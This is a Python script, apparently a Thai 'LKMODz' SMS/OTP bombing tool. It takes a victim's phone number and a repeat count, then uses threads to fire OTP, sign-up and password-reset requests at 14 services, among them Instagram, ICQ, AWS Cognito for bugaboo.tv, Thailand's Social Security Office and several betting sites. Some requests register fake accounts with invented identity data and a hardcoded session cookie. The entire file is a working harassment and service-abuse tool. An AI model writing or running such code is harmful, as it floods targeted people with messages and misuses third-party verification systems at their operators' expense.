import requests
import threading
from threading import Thread
import time
import colorama
import platform
import os

def clear():# ไว้เช็ค os ที่ใช้
    so_name=platform.system()#ไว้เช็ค os
    if so_name=='Windows':
        os.system('cls')
    else:
        os.system('clear')
clear()

print("LKMODz")
print("phone : เบอร์")
print("number : จำนวน")

phone = input("\033[91mPHONE NUMBER : ")
number = int(input("\033[91mNUMBER : "))
clear()

useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"

def api1():
    requests.post("https://www.carsome.co.th/sell/request-otp",data={"current_phone_no":phone,"new_phone_no":phone,"lead_id":"1467606"})
    
def api2():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
	
def api3():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	
def api4():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	
def api5():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	
def api6():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data="email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	
def api7():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	
def api8():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	
def api9():
	requests.post("http://b226.com/x/code", data={"phone":phone})
	
def api10():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	
def api11():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	
def api12():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	
def api13():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	
def api14():
	requests.post("https://queenclub88.com/api/register/phone",data={" phone":phone})
	
for i in range(number):
    threading.Thread(target=api1).start()
    print("\33[92m API WWW.CARSOME.CO.TH")
    threading.Thread(target=api2).start()
    print("\33[92m API U.ICQ.NET")
    threading.Thread(target=api3).start()
    print("\33[92m API COGNITO-IDP.AP-SOUTHEAST-1.AMAZONAWS.COM")
    threading.Thread(target=api4).start()
    print("\33[92m API COGNITO-IDP.AP-SOUTHEAST-1.AMAZONAWS.COM")
    threading.Thread(target=api5).start()
    print("\33[92m API API.SCG-ID.COM")
    threading.Thread(target=api6).start()
    print("\33[92m API WWW.INSTAGRAM.COM")
    threading.Thread(target=api7).start()
    print("\33[92m API UNACADEMY.COM")
    threading.Thread(target=api8).start()
    print("\33[92m API EP789BET.NET")
    threading.Thread(target=api9).start()
    print("\33[92m API B226.COM")
    threading.Thread(target=api10).start()
    print("\33[92m API WWW.MSPORT1688.COM")
    threading.Thread(target=api11).start()
    print("\33[92m API M.REDBUS.ID")
    threading.Thread(target=api12).start()
    print("\33[92m API WWW.SSO.GO.TH")
    threading.Thread(target=api13).start()
    print("\33[92m API WWW.MSPORT1688.COM")
    threading.Thread(target=api14).start()
    print("\33[92m API QUEENCLUB88.COM")